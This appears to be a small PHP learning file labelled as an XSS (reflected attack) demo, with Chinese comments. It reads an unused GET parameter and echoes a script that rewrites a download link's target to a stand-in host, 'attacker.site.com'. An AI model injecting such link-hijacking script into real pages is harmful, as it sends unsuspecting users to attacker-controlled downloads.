<?php

// xss攻击
// 非持久型攻击
if (isset($_GET['name'])) {
    $name = $_GET['name'];
    // var_dump($name);
    // 此处如果写入恶意js代码会被浏览器屏蔽
    //echo "welcome, $name";
}
echo "<a href='http://www.cnlogs.com'>click to download</a>";

$script = "<script type=\"text/javascript\">
        // 此处不会被浏览器屏蔽
        var link = document.getElementsByTagName('a');
        link[0].href='http://attacker.site.com'
    </script>";
echo $script;
?>


<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>xss-test</title>
    <link rel="stylesheet" href="">
</head>
<body>
    <iframe ></iframe>
</body>
</html>
